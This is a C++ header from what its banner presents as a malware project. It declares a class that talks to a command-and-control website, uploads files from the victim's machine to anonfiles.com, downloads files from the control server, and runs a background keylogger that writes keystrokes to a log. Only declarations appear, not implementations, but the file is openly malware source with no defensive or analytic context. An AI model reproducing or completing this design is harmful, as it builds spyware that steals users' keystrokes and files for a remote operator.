/*
##################################################
#                                                #
#         Malware Coder: Elliot Alderson         #
#                                                #
#   Github: https://github.com/ElliotAlderson51  #
#                                                #
##################################################
*/

#ifndef CURL_H
#define CURL_H

#include "Tools.h"

#include "TaskScheduler.h"

class Curl : TaskScheduler
{
	std::string redirect_website;
	std::string control_website;

	std::string mac_address;

	// Initialize the connection to the server
	void Initialize();

	// Message Communication  |  The default website is the constrol_website variable
	BOOL Send_Recv(std::string& result, std::string website = "", std::string parametres = "", BOOL isInitializing = FALSE);

	// Upload file to the website anonfiles.com/ and get the url of the uploaded file
	std::string anonFilesUpload(const std::string& file_path);

	// Download file from the uploads/ folder in the control website
	BOOL DownloadFile(const std::string& file);

	// Get word from string by index
	std::string getWord(const std::string& str, int index);

	// Keylogger
	BOOL Keylogger_status;
	BOOL KeyIsListed(char key, std::string file_path);
	void WriteToLog(std::string, std::string file_path);

	static DWORD WINAPI StaticKeyloggerThread(void* Param);
	DWORD WINAPI StartKeyloggerThread();

public:
	Curl();

	void Control();
	void Keylogger();
};

#endif // !CURL_H
